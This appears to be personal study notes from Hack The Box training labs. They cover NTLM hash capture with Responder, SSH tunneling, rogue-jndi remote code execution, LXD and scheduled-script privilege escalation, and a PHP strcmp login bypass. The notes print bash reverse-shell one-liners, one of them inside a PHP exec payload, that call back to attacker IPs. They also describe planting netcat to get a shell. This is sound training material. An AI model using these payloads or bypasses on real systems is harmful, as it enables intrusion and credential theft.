![[Screenshot 2024-05-10 at 5.24.12 PM.png]]


- Before updating the `/etc/hosts` file, your system did not know how to resolve "unika.htb" to an IP address. Although the server told your browser to go to "unika.htb", without a valid DNS entry (in public DNS or via your `/etc/hosts` file), your system couldn't resolve this domain to an IP address, hence the page could not load.
- The domain "unika.htb" suggests a domain used for internal or development purposes, which wouldn't be resolvable through public DNS servers. It's typical in development and testing environments to use `.htb` (hack the box) or similar top-level domains not recognized by public DNS.

"This lab focuses on how a File Inclusion vulnerability on a webpage being served on a Windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server"

***
***

**NTLM**

![[Visuals.canvas]]
The NTLM authentication process is done in the following way : 
1. The client sends the user name and domain name to the server. 
2. The server generates a random character string, referred to as the challenge. 
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server. 
4. The server retrieves the user password (or equivalent). 
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.
***

#### **Responder**
#tools 

Python tool capable of performing many attacks but will focus on serving a malicious SMB share for the web-server to authenticate to

When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2.

We will then attempt to crack the hash



- Initially I tried to serve the machine a malicious php reverse shell via python but received an error

```
<?php 
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.71/5555 0>&1'");
?>
```

![[Screenshot 2024-05-10 at 8.32.16 PM.png]]

In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash.

- Add IP and domain name to `/etc/hosts`

- Enumerate subdomains `x.thetoppers.htb` 

Often, different subdomains will have different IP addresses, so when our system goes to look up the subdomain, it gets the address of the server that handles that application. It is also possible to have one server handle multiple subdomains. This is accomplished via "host-based routing", or "virtual host routing", where the server uses the Host header in the HTTP request to determine which application is meant to handle the request.

#### ==SSH Tunneling==

[[Visuals.canvas|Visuals]]



The SSH protocol is vastly used for maintaining and accessing remote systems in a secure and encrypted way. But, it also offers the possibility to create tunnels that operate over the SSH protocol. More specifically, SSH offers various types of tunnels

There are some potential workarounds involving uploading static binaries onto the target machine to exploit, however, an easier way to bypass this roadblock is by a practice called ==port-forwarding, or tunneling, using SSH .==


==`ssh -L 1234:localhost:5432 christine@10.129.228.195`==

![[Screenshot 2024-05-15 at 8.11.43 PM.png]]


We can also send this tunnel to the background in order to keep working within the same shell by using `-f` and `-N` switches:

==`ssh -L 1234:localhost:5432 christine@10.129.228.195 -f -N`==

These applications will also help us run the `rogue-jndi` Java application, which starts a local ==LDAP server== and allows us to receive connections back from the vulnerable server and execute malicious code.


Let's clone the respective repository and build the package using Maven. 
==`git clone https://github.com/veracode-research/rogue-jndi`== 
==`cd rogue-jndi`==

### Description
The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.<br> 
In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:

java
InitialContext.doLookup("ldap://your_server.com:1389/o=reference");

It will initiate a connection from the vulnerable client to the local LDAP server.
Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution.
```

==`mvn package`==

This will create a .jar file in `rogue-jndi/target/` directory called `RogueJndi-1.1.jar` . Now we can construct our payload to pass into the `RogueJndi-1-1.jar` Java application. 

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.


==`echo 'bash -c bash -i >&/dev/tcp/10.10.16.45/5555 0>&1'| base64`==

The output reveals a user called Administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. 

Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility

LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

Check for mismatched permissions between script and usergroup or file configuration

![[Pasted image 20240528162346.png]]


Looking at the permissions of job.bat using icacls reveals that the group `BUILTIN\Users` has full control (F) over the file. The `BUILTIN\Users` group represents all local users, which includes Daniel as well. We might be able to get a shell by transferring netcat to the system and modifying the script to execute a reverse shell.





Before then, we need to check if the wevtutil process mentioned in the job.bat file is running. We can see the currently scheduled tasks by typing the ==`schtasks`== command. 

If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use Powershell's ps command instead, which represents another security misconfiguration that works against the server.

`schtasks`

`powershell`



![[Pasted image 20240528162658.png]]

![[Pasted image 20240528162711.png]]

We can see that the process wevtutil is running, which is the same process listed in the job.bat file. This indicates that the .bat script might be executing.

Because the target host does not have access to the Internet, we will need to deliver the nc64.exe executable through our own connection with the target. 

In order to do so, we will first need to download nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we have on the host to issue a wget command with our address and the nc64.exe file residing on our server. 

This will initialize a download from the host to our Python server for the executable. Make sure you don't switch folders after downloading the executable. 

The Python HTTP server needs to be running in the same directory as the location of the downloaded nc64.exe file we want to deliver to the target.

This file checks the username/password combination that the user submits against the variables that are stored in the config file (which is potentially communicating with a database) to see if they match.


The developer is using the strcmp function to check the username and password combination. This function is used for string comparison and returns 0 when the two inputted values are identical, however, it is insecure and the authentication process can potentially be bypassed without having a valid username and password.

This is due to the fact that if strcmp is given an empty array to compare against the stored password, it will return NULL . ==In PHP the `==` operator only checks the value of a variable for equality, and the value of NULL is equal to 0 .==

The correct way to write this would be with the === operator which checks both value and type. These are prominently known as "Type Juggling bugs"

In PHP, variables can be easily converted into arrays if we add [] in front of them

Adding [] changes the variable $username to an array, which means that strcmp() will compare the array instead of a string.

If we convert those variables into empty arrays ( $username[] & $password[] ), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.
